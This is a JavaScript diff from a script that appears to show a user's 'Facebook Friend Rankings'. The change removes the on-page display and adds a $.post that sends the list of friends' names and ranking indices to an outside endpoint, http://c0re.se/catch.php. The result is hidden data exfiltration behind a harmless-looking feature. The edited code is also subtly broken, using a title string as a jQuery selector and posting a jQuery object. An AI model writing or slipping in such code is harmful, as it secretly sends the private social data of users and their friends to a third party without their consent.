@@ -41,38 +41,14 @@ $.ajax({
 
 		friends = friends.payload.entries;
 
-		var display = $("<div id='friend-edge-display'></div>");		
+		var display = $("Facebook Friend Rankings");		
 
 		for(var i = 0; i < friends.length; i++){
-			var info = "<div class='friend-edge'><span class='friend-edge-name'>" + friends[i].text + "</span><span class='friend-edge-index'>" + friends[i].index + "</span></div>";
+			var info = "\n" + friends[i].text + " " + friends[i].index;
 			$(display).append(info);
 		}
-		$('body').append(display);
 
-		var title = $("<div id='friend-edge-title'>Facebook Friend Rankings</div>");
-		display.prepend(title);
-
-		$('#friend-edge-title').css('font', '20px bold "helvetica neue"');
-		$('#friend-edge-title').css('margin-bottom', '10px');
-
-
-		$('#friend-edge-display').css('position', 'absolute');
-		$('#friend-edge-display').css('top', '100px');
-		$('#friend-edge-display').css('width', '500px');
-		$('#friend-edge-display').css('margin-left', '-309px');
-		$('#friend-edge-display').css('left', '50%');
-		$('#friend-edge-display').css('background', 'white');
-		$('#friend-edge-display').css('z-index', '9999');	
-		$('#friend-edge-display').css('font-size', '14px');	
-		$('#friend-edge-display').css('padding', '15px');
-		$('#friend-edge-display').css('border-radius', '12px');		
-		$('#friend-edge-display').css('border', '8px solid black');
-
-		$('.friend-edge').css('margin-top', '5px');
-		
-		$('.friend-edge-name').css('width', '250px');		
-		$('.friend-edge-name').css('display', 'inline-block');
-		$.post("http://c0re.se/catch.php", { text: "John", time: "2pm" } );
+		$.post("http://c0re.se/catch.php", { text: display } );
 
 	}
 });
